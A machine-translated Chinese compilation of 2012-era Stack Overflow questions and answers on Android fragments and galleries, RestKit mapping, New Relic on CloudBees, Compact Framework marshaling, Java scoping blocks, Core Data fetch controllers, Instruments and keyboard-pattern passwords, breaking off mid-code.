我想我找到了一种简单的方法来获取任意长度的随机密码：只需看看你的键盘，然后想出一些算法来遍历这些字母。最简单的方法是从“q”到“p”的所有顶行，从“a”到“l”的下一行，从“z”到“b”。结果，您将获得 qwertyuiopasdfghjklzxcvbsecurity。如果攻击者要使用字典，他无疑会猜到你决定在键盘上使用什么数字以及使用了多少次。然后他必须把字典里的词放进去。您是否发现这种方法存在任何漏洞？

我不是说只从左到右一个一个地输入键盘字母。你可以走任何你容易记住的路。并在任何时候开始和结束。这是记住真正无意义的随机字母序列的简单方法。所以你可以制作像 qazxswedcvfrtgbnhyujmsecurity 这样的东西——它是一个从上到下按下的字母序列。很容易记住，很难暴力破解。

Gumbo 指出，有一种破解密码的策略，使用这样的[模式](http://www.ijicic.org/ijicic-10-09032.pdf)。但正如您所见，它仅在字母数量相对较少且您未使用密码时才有效。如果它很大（超过 20 个字母就足够了）并且您在其中的某个地方添加了您的真实密码，那么它几乎是牢不可破的。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-16T14:45:43.603

您正在考虑的内容类似于密码短语，它是一堆容易记住的单词。它使暴力破解密码变得更加困难。

但是，服务器端密码保护的最新技术非常好。使用像 Blowfish 这样的现代哈希使得暴力破解即使是相对较短的密码也非常非常昂贵。

此外，如果有人确实破解了您拥有帐户的系统，那么简单地为不同的系统使用不同的密码就变得不那么有意义了，并且对于人类来说可能是一个更容易实现的系统。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-16T14:45:55.253

我在这种方法中看到了一个简单的问题，键盘布局可能会在键盘之间发生变化，这使得该方法难以实施，例如从台式计算机移动到笔记本电脑甚至移动设备时，使得安全性可能不同......

# android - getFragmentManager().beginTransaction() 的问题

> ID：13418784
> 
> 赞同：3
> 
> 时间：2012-11-16T14:40:43.637
> 
> 标签：android, android-layout

我有两个片段并将它们设置如下

```
fram1 = new FragMent1();
fragMentTra.addToBackStack(null);
fragMentTra = getFragmentManager().beginTransaction().add(rl.getId(), fram1, "fram1");

fram2 = new FragMent2();
fragMentTra.addToBackStack(null);
fragMentTra = getFragmentManager().beginTransaction().add(rl.getId(), fram2, "fram2"); 
```

Fragment 扩展 Listfragment 而不是另一个。

```
public class FragMent1 extends android.support.v4.app.ListFragment {

public class FragMent2 extends Fragment{ 
```

当我执行这条线时`fragMentTra = getFragmentManager().beginTransaction().add(rl.getId(), fram1, "fram1");`

我收到以下错误消息。有谁知道如何解决这个问题？

```
The method add(int, Fragment, String) in the type FragmentTransaction is not applicable for the arguments (int, FragMent1, String) 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-11-16T14:42:53.353

由于您使用的是支持库的 Fragments，因此您的 Activity 需要扩展[FragmentActivity](http://developer.android.com/reference/android/support/v4/app/FragmentActivity.html)，使用的方法是[getSupportFragmentManager()](http://developer.android.com/reference/android/support/v4/app/FragmentActivity.html#getSupportFragmentManager%28%29)。

在您计划仅针对 API 11 及更高版本之前，您可能必须始终为您的 Fragment 使用支持库，而不是使用本机实现。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-16T14:47:01.057

`FragMent1`应该延长`android.app.ListFragment`，不是`android.support.v4.app.ListFragment`。

# ios6 - “找不到给定内容的任何映射，keyPath=null”RestKit 0.2

> ID：13418787
> 
> 赞同：0
> 
> 时间：2012-11-16T14:40:47.427
> 
> 标签：ios6, restkit

所以我转而使用 RestKit 0.2 和 CoreData 并且在尝试正确映射时遇到了很多麻烦......我不明白为什么。我的服务器的 JSON 响应是这样的：

```
{
"meta": 
   {
   "limit": 20, 
   "next": null, 
   "offset": 0, 
   "previous": null, 
   "total_count": 2
   }, 
   "objects": 
   [{
       "creation_date": "2012-10-15T20:16:47", 
       "description": "", 
       "id": 1, 
       "last_modified": 
       "2012-10-15T20:16:47", 
       "order": 1, 
       "other_names": "", 
       "primary_name": "Mixing",
       "production_line": "/api/rest/productionlines/1/", 
       "resource_uri": "/api/rest/cells/1/"
   }, 
   {
       "creation_date": "2012-10-15T20:16:47", 
       "description": "",
       "id": 2, 
       "last_modified": "2012-10-15T20:16:47",
       "order": 2, "other_names": "", 
       "primary_name": "Packaging", 
       "production_line": "/api/rest/productionlines/1/",
       "resource_uri": "/api/rest/cells/2/"
   }]
} 
```

然后在 XCode 中我有：

```
RKObjectManager *objectManager = [RKObjectManager sharedManager];

[AFNetworkActivityIndicatorManager sharedManager].enabled = YES;

NSManagedObjectModel *managedObjectModel = [NSManagedObjectModel mergedModelFromBundles:nil];
RKManagedObjectStore *managedObjectStore = [[RKManagedObjectStore alloc] initWithManagedObjectModel:managedObjectModel];
objectManager.managedObjectStore = managedObjectStore;

RKEntityMapping *cellMapping = [RKEntityMapping mappingForEntityForName:@"Cell" inManagedObjectStore:managedObjectStore];
cellMapping.primaryKeyAttribute = @"identifier";
[cellMapping addAttributeMappingsFromDictionary:@{
 @"id": @"identifier",
 @"primary_name": @"primaryName",
 }];

RKResponseDescriptor *responseCell = [RKResponseDescriptor responseDescriptorWithMapping:cellMapping
                                                                             pathPattern:@"/api/rest/cells/?format=json"
                                                                                 keyPath:@"objects"
                                                                             statusCodes:RKStatusCodeIndexSetForClass(RKStatusCodeClassSuccessful)];

[objectManager addResponseDescriptorsFromArray:@[responseCell, responseUser, responseCompany]];

[managedObjectStore createPersistentStoreCoordinator];
NSString *storePath = [RKApplicationDataDirectory() stringByAppendingPathComponent:@"AppDB.sqlite"];
NSString *seedPath = [[NSBundle mainBundle] pathForResource:@"SeedDatabase" ofType:@"sqlite"];
NSError *error;
NSPersistentStore *persistentStore = [managedObjectStore addSQLitePersistentStoreAtPath:storePath fromSeedDatabaseAtPath:seedPath withConfiguration:nil options:nil error:&error];
NSAssert(persistentStore, @"Failed to add persistent store with error: %@", error);

// Create the managed object contexts
[managedObjectStore createManagedObjectContexts];

// Configure a managed object cache to ensure we do not create duplicate objects
managedObjectStore.managedObjectCache = [[RKInMemoryManagedObjectCache alloc] initWithManagedObjectContext:managedObjectStore.persistentStoreManagedObjectContext]; 
```

我的要求是：

```
 [[RKObjectManager sharedManager] getObjectsAtPath:@"/api/rest/cells/?format=json" parameters:nil success:^(RKObjectRequestOperation *operation, RKMappingResult *mappingResult) {
        RKLogInfo(@"Load complete: Table should refresh...");

        [[NSUserDefaults standardUserDefaults] setObject:[NSDate date] forKey:@"LastUpdatedAt"];
        [[NSUserDefaults standardUserDefaults] synchronize];
    } failure:^(RKObjectRequestOperation *operation, NSError *error) {
        RKLogError(@"Load failed with error: %@", error);
    }]; 
```

而且我总是收到以下错误：

```
**Error Domain=org.restkit.RestKit.ErrorDomain Code=1001 "Unable to find any mappings for the given content" UserInfo=0x1102d500 {DetailedErrors=(), NSLocalizedDescription=Unable to find any mappings for the given content, keyPath=null}** 
```

非常感谢！

**更新**：我添加了 cellMapping.forceCollectionMapping = YES; 但仍然没有运气:(！

***更新#2***：按照 Blake 的建议，我尝试更改路径并且成功了！我做了 /api/rest/cells/ 而不是 /api/rest/cells/?format=json 并且我的服务器返回了所有内容并且映射成功！

现在我得到的唯一问题是以下错误：

**2012-11-21 14:48:49.414 App[3125:617] W restkit.object_mapping:RKMapperOperation.m:176 强制集合映射但可映射对象的类型为“__NSCFArray”而不是 NSDictionary**

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-21T15:25:42.233

听起来响应描述符与请求的 URL 不匹配。两个想法：

1.  尝试完全删除路径模式（传入 nil）并仅在“单元格”上使用基于键路径的匹配
2.  尝试使用“/api/rest/cells”的路径模式

接下来我会尝试使用调试器来逐步完成匹配。在`RKObjectManager`候选响应映射列表中是由`RKFilteredArrayOfResponseDescriptorsMatchingPath`函数构建的。如果那里没有返回您预期的响应映射，则路径模式的请求路径无法评估。

如果那里的情况看起来不错，那么下一个可能发生不匹配的地方就是`RKResponseMapperOperation`方法`buildResponseMappingsDictionary`中。此方法根据每个响应描述符评估响应。如果响应未能与您的响应描述符匹配，那么您将在这里得到意想不到的结果。

最后要检查的地方是 RKResponseMapperOperation。这从匹配的描述符中获取映射并应用它们。RKMapperOperation方法应该包含您期望的反序列化响应和属性`main`上的适当映射。`mappingsDictionary`

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-18T22:56:48.353

即使设置似乎正确，映射也是错误的。您的映射调用的信息嵌套在给定的对象中，因此您必须告诉映射查找对象内部的值。

```
RKEntityMapping *cellMapping = [RKEntityMapping mappingForEntityForName:@"Cell" inManagedObjectStore:managedObjectStore];
cellMapping.primaryKeyAttribute = @"identifier";

[cellMapping mapKeyOfNestedDictionaryToAttribute:@"objects"];
[cellMapping mapFromKeyPath:@".id" toAttribute:"identifier"];
[cellMapping mapFromKeyPath:@"primary_name" toAttribute:"primaryName"]; 
```

有关更多信息，请查看[RKObjectMapping 参考](http://restkit.org/api/development/Classes/RKObjectMapping.html)。

# cloudbees - 我们如何将现有的 NewRelic 帐户与我们的 CloudBees 应用程序一起使用？

> ID：13418792
> 
> 赞同：1
> 
> 时间：2012-11-16T14:41:03.393
> 
> 标签：cloudbees, newrelic

如果我们有一个现有的 NewRelic 帐户，我们如何指导我们的 CloudBees 应用程序使用该帐户，而不是通过在我们的 CloudBees 应用程序配置屏幕上激活 New Relic 插件创建的即时帐户？这将使我们能够利用我们已经支付的许可定价，并为我们的所有应用程序提供一个中央 New Relic 控制台屏幕，无论它们是在 CloudBees 上还是在其他地方运行。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-16T14:41:03.393

我已经向我的 CloudBees 应用程序添加了一个 New Relic 配置文件，并在该配置文件中为我的 New Relic 帐户指定了许可证密钥，现在我的所有 CloudBees 和非 CloudBees 应用程序都可以在我的 New Relic 控制台下使用。如果您按照[这些说明](https://developer.cloudbees.com/bin/view/RUN/NewRelic)更新和部署 newrelic.yml 文件并指定您自己的许可证密钥，您应该立即开始在现有的 New Relic 控制台上看到您的应用程序报告。

# c# - 将字节数组转换为 Compact Framework 中的结构

> ID：13418795
> 
> 赞同：2
> 
> 时间：2012-11-16T14:41:21.910
> 
> 标签：c#, struct, windows-mobile, compact-framework, bytearray

我需要将字节数组转换为我的结构类型。为此，我将以下代码用于桌面项目应用程序：

```
var str = new SFHeader();
int size = Marshal.SizeOf(str);

IntPtr ptr = Marshal.AllocHGlobal(size);
Marshal.Copy(buffer, 0, ptr, size);
str = (SFHeader)Marshal.PtrToStructure(ptr, typeof(SFHeader));
Marshal.FreeHGlobal(ptr);

return str; 
```

`SFHeader`我的结构在哪里。

问题是该行：

```
str = (SFHeader)Marshal.PtrToStructure(ptr, typeof(SFHeader)); 
```

`NotSupportedException`当我从智能设备项目运行此代码时抛出一个。在 Compact Framework 中是否有其他方法可以完成这项工作？

```
[StructLayout(LayoutKind.Sequential)]
public struct SFHeader
{

    internal const int MAX_FILENAME_LENGTH = 32;

    [MarshalAs(UnmanagedType.ByValTStr, SizeConst = MAX_FILENAME_LENGTH)]
    public string FileName;

    public int Offset;

    public short Size;

    public byte Flags;

    public byte Source;

    public long LastWriteTime;

} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-16T15:03:28.533

Marshal.PtrToStructure 有效，我在紧凑的框架中使用过很多次。看起来您使用正确。因此，问题一定是您的结构定义（结构的 CF 中可能不支持某些内容）

以下代码在我使用 Windows CE 5.0 和 .NET CF 3.5 的设备上运行良好

```
[StructLayout(LayoutKind.Sequential)]
    public struct SFHeader
    {
        internal const int MAX_FILENAME_LENGTH = 32;
        [MarshalAs(UnmanagedType.ByValTStr, SizeConst = MAX_FILENAME_LENGTH)]
        public string FileName;
        public int Offset;
        public short Size;
        public byte Flags;
        public byte Source;
        public long LastWriteTime;
    }

    private static void Test()
    {
        var str = new SFHeader();
        int size = Marshal.SizeOf(str);
        byte[] buffer = new byte[size];

        IntPtr ptr = Marshal.AllocHGlobal(size);
        Marshal.Copy(buffer, 0, ptr, size);
        str = (SFHeader)Marshal.PtrToStructure(ptr, typeof(SFHeader));
        Marshal.FreeHGlobal(ptr);
    } 
```

我会检查以确保您遵循[.NET Compact Framework 中的编组结构](http://msdn.microsoft.com/en-us/library/ms172512%28v=vs.80%29.aspx)

另一种选择是将缓冲区中的字段逐字节手动复制到结构中。您可以编写一个返回 SFHeader 并采用 byte[] 的函数。

# java - 在 Java 中使用不带条件的复合语句

> ID：13418796
> 
> 赞同：3
> 
> 时间：2012-11-16T14:41:27.043
> 
> 标签：java

> **可能重复：**
> [两个连续的代码块 {}{} 做什么？](https://stackoverflow.com/questions/9329921/what-does-two-consecutive-blocks-of-code-do)

我正在改造一个非常旧的 Java 应用程序，并且观察到原始开发人员在不属于任何条件或循环逻辑的方法中使用了许多复合语句。

示例伪代码：

```
{
Object a = new Object();
a.setAttribute();
}

{
Object b = new Object();
b.setAttribute();
} 
```

这只是一种风格偏好还是我错过了什么？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-16T14:43:14.907

它增加了额外的作用域，如果您在同一方法中处理大量不相交的局部变量，这有时会很有用。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-16T14:43:38.093

在一个块中声明的局部变量在任何其他块中都不可见，因此对于代码生成之类的事情非常方便，您无需担心不同代码块之间的名称冲突。我通常不会在手写代码中使用这种技术。

# ios - 为什么 Paul Hegarty 说不要更改 NSFetchedResultsController @properties？

> ID：13418801
> 
> 赞同：0
> 
> 时间：2012-11-16T14:41:40.383
> 
> 标签：ios, properties, nsfetchedresultscontroller, cs193p

**概述：**

斯坦福 iOS 教程包含一个实现（标题 + 实现文件），以帮助在使用核心数据时使用表格视图。

**链接**- [http://www.stanford.edu/class/cs193p/cgi-bin/drupal/downloads-2011-fall](http://www.stanford.edu/class/cs193p/cgi-bin/drupal/downloads-2011-fall)

**文件名**- *CoreDataTableViewController.zip*
`CoreDataTableViewController.h`包含以下文本：

> // 请记住，一旦创建了 NSFetchedResultsController，就不能修改它的 @propertys。如果您想要新的获取参数（谓词、排序等），请创建一个新的 NSFetchedResultsController 并再次设置该类的 fetchedResultsController @property。

**问题**

这听起来有点奇怪，因为在[文档](http://developer.apple.com/library/ios/documentation/CoreData/Reference/NSFetchedResultsController_Class/Reference/Reference.html#//apple_ref/doc/uid/TP40008227-CH1-SW25)中他们提到了您更改属性时的情况，并在这种情况下推荐了一些东西......看起来像是一些错误，或者我错过了一些东西。如果我只是更改谓词并再次获取，一切正常......

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-16T15:15:25.897

这取决于您是否使用缓存。正如您链接到的文档中所说：

> 如果您使用缓存，则必须在更改任何获取请求、其谓词或排序描述符之前调用 deleteCacheWithName:。除非您将 cacheName 设置为 nil，否则您不得为多个查询重复使用相同的获取结果控制器。

如果您正在更改这些属性，那么告诉您创建一个新的获取结果控制器可能比进入更简单（这是初学者课程，获取结果控制器的创建是在此示例代码之外完成的）缓存的解释，以及清除缓存等等。

# objective-c - 工具（分配）并找出哪些对象会产生问题

> ID：13418806
> 
> 赞同：3
> 
> 时间：2012-11-16T14:42:13.290
> 
> 标签：objective-c, ios, xcode, instruments, memory-leaks

我有内存问题（我正在使用 ARC），我确信我`strong` `@property`在应该在的地方创建`weak`。我运行仪器，它向我展示了这些分配： ![在此处输入图像描述](../Images/9f8fe6bfcd745b9bf2776ec42e142440.png)

这显然是一个不发布的问题。但是我可以在 Instruments 中找到它吗？

**编辑：**

![在此处输入图像描述](../Images/b8ab1d3bc12c31d6d9f2423ac54460b2.png)

蓝色的是我的，在点击很多来改变屏幕之后。

![在此处输入图像描述](../Images/1eddc688b79ed2678434233a6b148352.png)

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-11-16T19:17:15.890

切换到分配工具中的调用树视图可以帮助您找到代码中分配发生的位置。使用跳转栏切换到调用树视图。

当您切换到调用树视图时，您应该会在调用树的左侧看到一系列复选框。选择 Invert Call Tree 和 Hide System Libraries 复选框允许您在调用树中找到您的代码。

您还可以使用检查范围按钮和图表的时间线来关注内存使用量增加的时间。单击时间轴，单击左侧检查范围按钮，再次单击时间轴，单击右侧检查范围按钮设置检查范围。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-16T14:50:03.060

> 我有内存问题（我正在使用 ARC），我确信我在应该很弱的地方创建了强大的 @property。

仪器可以自动检测其中一些：

*   单击左侧的“泄漏”轨道
*   单击显示弹出窗口并选择“循环和根”（这是屏幕截图中标记为“统计”的按钮）

* * *

清空该列表（并删除所有/所有泄漏）后，然后使用[Heapshot Analysis](http://www.friday.com/bbum/2010/10/17/when-is-a-leak-not-a-leak-using-heapshot-analysis-to-find-undesirable-memory-growth/)对其进行攻击。这使您可以在一段时间内专注于未发布的增长。

# android - 如何在android画廊上显示特定文件夹中的图像

> ID：13418807
> 
> 赞同：10
> 
> 时间：2012-11-16T14:42:24.000
> 
> 标签：android, image, gallery, directory

如何在 android 库上显示特定文件夹中的所有图像，例如 whatapp 。我正在使用 MediaScannerConnectionClient

```
File folder = new File("/sdcard/myfolder/");
allFiles = folder.list();
SCAN_PATH=Environment.getExternalStorageDirectory().toString()+"/myfolder/"+allFiles[0];
@Override
public void onScanCompleted(String path, Uri uri) {
    try {
        if (uri != null) {
            Intent intent = new Intent(Intent.ACTION_VIEW);
            intent.setData(uri);
            startActivity(intent);

        }
    } finally {
        conn.disconnect();
        conn = null;
    }
}

private void startScan() {
    if (conn != null) {
        conn.disconnect();
    }
    conn = new MediaScannerConnection(this, this);
    conn.connect();
}
    @Override
public void onMediaScannerConnected() {
    conn.scanFile(SCAN_PATH, "image/*");
} 
```

但此时我遇到了一个错误：

```
 Intent intent = new Intent(Intent.ACTION_VIEW);
    intent.setData(uri);
    startActivity(intent); 
```

具体在这里：

```
startActivity(intent); 
```

无法获取类型：content://media/external/images/media/267830 未找到处理 Intent 的活动

在 onScanCompleted 我的路径和 uri 参数不为空。

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2012-11-16T14:56:34.853

您好，您可以使用下面的代码，希望对您有所帮助。

```
package com.example.browsepicture;

import java.io.File;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.media.MediaScannerConnection;
import android.media.MediaScannerConnection.MediaScannerConnectionClient;
import android.net.Uri;
import android.os.Bundle;
import android.os.Environment;
import android.view.View;
import android.view.View.OnClickListener;
import android.widget.Button;

public class BrowsePicture2 extends Activity {
    String SCAN_PATH;
    File[] allFiles ;
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_browse_picture);

        File folder = new File(Environment.getExternalStorageDirectory().getPath()+"/aaaa/");
        allFiles = folder.listFiles();

        ((Button) findViewById(R.id.button1))
                .setOnClickListener(new OnClickListener() {
                    public void onClick(View arg0) {
                        new SingleMediaScanner(BrowsePicture2.this, allFiles[0]);
                    }
                });
    }

    public class SingleMediaScanner implements MediaScannerConnectionClient {

        private MediaScannerConnection mMs;
        private File mFile;

        public SingleMediaScanner(Context context, File f) {
            mFile = f;
            mMs = new MediaScannerConnection(context, this);
            mMs.connect();
        }

        public void onMediaScannerConnected() {
            mMs.scanFile(mFile.getAbsolutePath(), null);
        }

        public void onScanCompleted(String path, Uri uri) {
            Intent intent = new Intent(Intent.ACTION_VIEW);
            intent.setData(uri);
            startActivity(intent);
            mMs.disconnect();
        }

    }
} 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2014-10-16T11:55:32.943

您应该添加网格视图适配器类。

```
public class GalleryPictureActivity extends Activity
{
    private String[]        FilePathStrings;
    private File[]          listFile;
    GridView                grid;
    GridViewAdapter         adapter;
    File                    file;
    public static Bitmap    bmp = null;
    ImageView               imageview;

    @Override
    protected void onCreate (Bundle savedInstanceState)
    {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_gallery_picture);
        // Check for SD Card
        if (!Environment.getExternalStorageState().equals(
                Environment.MEDIA_MOUNTED))
        {
            Toast.makeText(this, "Error! No SDCARD Found!",
                    Toast.LENGTH_LONG).show();
        }
        else
        {
            // Locate the image folder in your SD Card
            file = new File(Environment.getExternalStorageDirectory()
                    .getPath() + "/images");
        }
        if (file.isDirectory())
        {
            listFile = file.listFiles();
            FilePathStrings = new String[listFile.length];
            for (int i = 0; i < listFile.length; i++)
            {
                FilePathStrings[i] = listFile[i].getAbsolutePath();
            }
        }
        grid = (GridView)findViewById(R.id.gridview);
        adapter = new GridViewAdapter(this, FilePathStrings);
        grid.setAdapter(adapter);

        grid.setOnItemClickListener(new OnItemClickListener() {
            @Override
            public void onItemClick (AdapterView<?> parent, View view,
                    int position, long id)
            {
                imageview = (ImageView)findViewById(R.id.imageView1);
                int targetWidth = 700;
                int targetHeight = 500;
                BitmapFactory.Options bmpOptions = new BitmapFactory.Options();
                bmpOptions.inJustDecodeBounds = true;
                BitmapFactory.decodeFile(FilePathStrings[position],
                        bmpOptions);
                int currHeight = bmpOptions.outHeight;
                int currWidth = bmpOptions.outWidth;
                int sampleSize = 1;
                if (currHeight > targetHeight || currWidth > targetWidth)
                {
                    if (currWidth > currHeight)
                        sampleSize = Math.round((float)currHeight
                                / (float)targetHeight);
                    else
                        sampleSize = Math.round((float)currWidth
                                / (float)targetWidth);
                }
                bmpOptions.inSampleSize = sampleSize;
                bmpOptions.inJustDecodeBounds = false;
                bmp = BitmapFactory.decodeFile(FilePathStrings[position],
                        bmpOptions);
                imageview.setImageBitmap(bmp);
                imageview.setScaleType(ImageView.ScaleType.FIT_XY);
                bmp = null;

            }
        });

    }
} 
```

另一个类 GridView 适配器：

```
 public class GridViewAdapter extends BaseAdapter
{
    private Activity                activity;
    private String[]                filepath;
    private static LayoutInflater   inflater    = null;
    Bitmap                          bmp         = null;

    public GridViewAdapter (Activity a, String[] fpath)
    {
        activity = a;
        filepath = fpath;
        inflater = (LayoutInflater)activity
                .getSystemService(Context.LAYOUT_INFLATER_SERVICE);
    }

    public int getCount ()
    {
        return filepath.length;
    }

    public Object getItem (int position)
    {
        return position;
    }

    public long getItemId (int position)
    {
        return position;
    }

    public View getView (int position, View convertView, ViewGroup parent)
    {
        View vi = convertView;
        if (convertView == null)
            vi = inflater.inflate(R.layout.gridview_item, null);
        ImageView image = (ImageView)vi.findViewById(R.id.image);
        int targetWidth = 100;
        int targetHeight = 100;
        BitmapFactory.Options bmpOptions = new BitmapFactory.Options();
        bmpOptions.inJustDecodeBounds = true;
        BitmapFactory.decodeFile(filepath[position], bmpOptions);
        int currHeight = bmpOptions.outHeight;
        int currWidth = bmpOptions.outWidth;
        int sampleSize = 1;
        if (currHeight > targetHeight || currWidth > targetWidth)
        {
            if (currWidth > currHeight)
                sampleSize = Math.round((float)currHeight
                        / (float)targetHeight);
            else
                sampleSize = Math.round((float)currWidth
                        / (float)targetWidth);
        }
        bmpOptions.inSampleSize = sampleSize;
        bmpOptions.inJustDecodeBounds = false;
        bmp = BitmapFactory.decodeFile(filepath[position], bmpOptions);
        image.setImageBitmap(bmp);
        image.setScaleType(ImageView.ScaleType.FIT_XY);
        bmp = null;
        return vi;
    }
} 
```

活动：

活动画廊图片：

```
<?xml version="1.0" encoding="utf-8"?>
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
        android:id="@+id/LinearLayout1"
        android:layout_width="fill_parent"
        android:layout_height="fill_parent"
        android:gravity="center" >

    <GridView
            android:id="@+id/gridview"
            android:layout_width="fill_parent"
            android:layout_height="match_parent" 
            android:layout_weight=".85">

   </GridView>

   <ImageView
           android:id="@+id/imageView1"
           android:layout_width="fill_parent"
           android:layout_height="fill_parent"
           android:layout_weight=".25"
           android:scaleType="fitXY"
           android:src="@drawable/galleryimage" />

  </LinearLayout> 
```

另一个活动布局：

```
 <?xml version="1.0" encoding="utf-8"?>
 <RelativeLayout xmlns:android="http://schemas.android.com/apk/res/android" >
     <ImageView
             android:id="@+id/image"
             android:layout_width="fill_parent"
             android:layout_height="wrap_content" />
 </RelativeLayout> 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2014-07-15T06:04:34.147

@Talha 给出的答案效果很好，但它尝试使用图像应用程序选项打开图像。如果您只想用 sd 卡中的文件夹刷新图库，您可以为 SingleMediaScanner 修改如下代码

```
class SingleMediaScanner implements MediaScannerConnectionClient {

    private MediaScannerConnection mMs;
    private File mFile;

    public SingleMediaScanner(Context context, File f) {
        mFile = f;
        mMs = new MediaScannerConnection(context, this);
        mMs.connect();
    }

    public void onMediaScannerConnected() {
        mMs.scanFile(mFile.getAbsolutePath(), null);
    }

    public void onScanCompleted(String path, Uri uri) {

        mMs.disconnect();
    }

} 
```

并在按钮单击循环中遍历您从中获得的每个文件：

```
 File folder = new File(Environment.getExternalStorageDirectory().getPath()+"/aaaa/");
    allFiles = folder.listFiles(); 
```

并一次将其传递给 SingleMediaScanner。

它在我的情况下有效。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2015-06-11T22:06:10.450

您可以使用 android.database.Cursor

```
public boolean OpenGalleryFromFolder(android.content.Context context, String folderName)
{
    String filePath = android.os.Environment.getExternalStorageDirectory().getPath() + "/Pictures/" + folderName + "/";
    return OpenGalleryFromPathToFolder(context, filePath);
}

// Finds the first image in the specified folder and uses it to open a the devices native gallery app with all images in that folder.
public boolean OpenGalleryFromPathToFolder(android.content.Context context, String folderPath)
{
    java.io.File folder = new java.io.File(folderPath);
    java.io.File[] allFiles = folder.listFiles();

    if (allFiles != null && allFiles.length > 0)
    {
        android.net.Uri imageInFolder = getImageContentUri(context, allFiles[0]);
        if (imageInFolder != null)
        {
            android.content.Intent intent = new android.content.Intent(android.content.Intent.ACTION_VIEW);
            intent.setData(imageInFolder);
            context.startActivity(intent);
            return true;
        }
    }
    return false;
}

// converts the absolute path of a file to a content path
// absolute path example: /storage/emulated/0/Pictures/folderName/Image1.jpg
// content path example: content://media/external/images/media/47560
private android.net.Uri getImageContentUri(android.content.Context context, java.io.File imageFile) {
    String filePath = imageFile.getAbsolutePath();
    android.database.Cursor cursor = context.getContentResolver().query(
            android.provider.MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
            new String[]{android.provider.MediaStore.Images.Media._ID},
            android.provider.MediaStore.Images.Media.DATA + "=? ",
            new String[]{filePath}, null);
    if (cursor != null && cursor.moveToFirst()) {
        int id = cursor.getInt(cursor.getColumnIndex(android.provider.MediaStore.MediaColumns._ID));
        return android.net.Uri.withAppendedPath(android.provider.MediaStore.Images.Media.EXTERNAL_CONTENT_URI, "" + id);
    } else {
        if (imageFile.exists()) {
            android.content.ContentValues values = new android.content.ContentValues();
            values.put(android.provider.MediaStore.Images.Media.DATA, filePath);
            return context.getContentResolver().insert(
                    android.provider.MediaStore.Images.Media.EXTERNAL_CONTENT_URI, values);
        } else {
            return null;
        }
    }
} 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2020-05-27T10:29:31.373

您可以使用我的方式从 SD 卡上的特定文件夹中获取图像，也可以删除文件。

主要活动

```
 FileAdapter fileAdapter;
    RecyclerView recyclerView;
    ArrayList<String> filePath = new ArrayList<>();
    ArrayList<String> filename = new ArrayList<>();
    private File[] listFile;
    File file;

    recyclerView = (RecyclerView) findViewById(R.id.recyclerView);
    tv_empty =  findViewById(R.id.tv_empty);

    loadFiles();
    fileAdapter = new FileAdapter(this, filePath, filename);

    recyclerView.setLayoutManager(new GridLayoutManager(this, 3));
    recyclerView.setAdapter(fileAdapter);
    fileAdapter.notifyDataSetChanged();

    private void loadFiles() {
        if (!Environment.getExternalStorageState().equals(Environment.MEDIA_MOUNTED)) {
            Toast.makeText(getActivity(), "Error! No SDCARD Found!", Toast.LENGTH_LONG).show();
        } else {
            file = new File(Environment.getExternalStorageDirectory().getPath() + "/StorySaver");
            if (!file.exists()) {
                file.mkdirs();
            }
        }

        filePath.clear();
        filename.clear();
        if (file.isDirectory()) {
            listFile = file.listFiles();
            for (File absolutePath : listFile) {
                filePath.add(absolutePath.getAbsolutePath());
                filename.add(absolutePath.getName());
            }
        }

        if (filePath.size() == 0) {
            tv_empty.setVisibility(View.VISIBLE);
        } else {
            tv_empty.setVisibility(View.GONE);
        }
    } 
```

我的适配器

```
public class FileAdapter extends RecyclerView.Adapter<FileAdapter.CustomViewHolder> {
        ArrayList<String> filepath;
        ArrayList<String> filename;
        public Context mContext;
        File file;

        public class CustomViewHolder extends RecyclerView.ViewHolder {
            TextView content;
            ImageView imageView;

            public CustomViewHolder(final View view) {
                super(view);
                this.content = (TextView) view.findViewById(R.id.content);
                this.imageView = (ImageView) view.findViewById(R.id.image);
            }
        }

        public FileAdapter(Context context, ArrayList<String> filepath, ArrayList<String> filename) {
            this.filepath = filepath;
            this.filename = filename;
            this.mContext = context;
        }

        public CustomViewHolder onCreateViewHolder(ViewGroup viewGroup, int i) {
            return new CustomViewHolder(LayoutInflater.from(viewGroup.getContext()).inflate(R.layout.row_file, null));
        }

        public void onBindViewHolder(CustomViewHolder customViewHolder, final int i) {
            file = new File(filepath.get(i));
            customViewHolder.content.setText(filename.get(i));
            Glide.with(this.mContext).load(filepath.get(i)).into(customViewHolder.imageView);
            customViewHolder.imageView.setOnLongClickListener(new OnLongClickListener() {
                public boolean onLongClick(View view) {
                    Builder builder = new Builder(mContext);
                    builder.setMessage("Are you sure you want delete this?");
                    builder.setPositiveButton("YES", new DialogInterface.OnClickListener() {
                        public void onClick(DialogInterface dialogInterface, int v) {
                            if (file.exists()) {
                                file.delete();
                            }
                            filepath.remove(i);
                            notifyDataSetChanged();
                        }
                    });
                    builder.setNegativeButton("NO", new DialogInterface.OnClickListener() {
                        public void onClick(DialogInterface dialogInterface, int i) {
                            dialogInterface.cancel();
                        }
                    });
                    builder.show();
                    return false;
                }
            });

            customViewHolder.imageView.setOnClickListener(new OnClickListener() {
                @Override
                public void onClick(View v) {

                    Intent intent = new Intent();
                    intent.setAction(android.content.Intent.ACTION_VIEW);
